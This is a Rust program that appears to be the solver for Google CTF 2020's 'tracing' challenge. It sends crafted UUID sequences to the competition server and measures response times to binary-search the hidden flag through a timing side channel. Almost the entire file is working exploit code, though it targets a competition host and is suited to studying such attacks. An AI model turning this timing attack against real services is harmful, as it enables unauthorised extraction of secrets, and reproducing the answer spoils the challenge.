// Copyright 2020 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Use RUST_LOG=info or RUST_LOG=debug for more logging

use async_std::net::TcpStream;
use async_std::prelude::*;
use log::{debug, info};
use std::time::{Duration, Instant};
use uuid::Uuid;

const SERVER_ADDR: &str = "tracing.2020.ctfcompetition.com:1337";
const TEST_SAMPLES: usize = 0x1000;

enum ProbeOutcome {
    Higher,
    Lower,
}

fn increment_id(x: Uuid) -> Uuid {
    Uuid::from_u128(x.as_u128() + 1)
}

fn decrement_id(x: Uuid) -> Uuid {
    Uuid::from_u128(x.as_u128() - 1)
}

fn generate(target: Uuid, inc: impl Fn(Uuid) -> Uuid) -> Vec<u8> {
    let mut gen = target;
    let mut result = Vec::new();
    (0..TEST_SAMPLES)
        .map(|_| {
            gen = inc(gen);
            gen
        })
        .for_each(|id| result.extend(id.as_bytes()));
    result
}

async fn run_timing_test(data: &[u8]) -> Result<Duration, std::io::Error> {
    info!("Running test");
    let mut stream = TcpStream::connect(SERVER_ADDR).await?;
    stream.write_all(data).await?;

    debug!("Shutting down stream");
    stream.shutdown(async_std::net::Shutdown::Write)?;

    let mut buf = [0, 0, 0, 0];
    stream.read(&mut buf).await?;
    debug!("Start timing");
    let start = Instant::now();

    let _ = stream.read(&mut buf).await;

    Ok(start.elapsed())
}

async fn probe_target(target: Uuid) -> ProbeOutcome {
    let higher_duration = run_timing_test(&generate(target, increment_id))
        .await
        .unwrap();
    let lower_duration = run_timing_test(&generate(target, decrement_id))
        .await
        .unwrap();

    debug!("higher: {:?}", higher_duration);
    debug!("lower: {:?}", lower_duration);

    if higher_duration > lower_duration {
        ProbeOutcome::Higher
    } else {
        ProbeOutcome::Lower
    }
}

#[async_std::main]
async fn main() {
    env_logger::init();

    let mut delta: u128 = 1 << 126;
    let mut target: u128 = 1 << 127;
    while delta > 0 {
        let id = Uuid::from_u128(target);
        info!("probing {}", id);
        match probe_target(id).await {
            ProbeOutcome::Higher => {
                info!("higher");
                target += delta;
            }
            ProbeOutcome::Lower => {
                info!("lower");
                target -= delta;
            }
        }
        delta >>= 1;
    }

    println!(
        "My guess: {}",
        String::from_utf8_lossy(&target.to_be_bytes())
    );
}
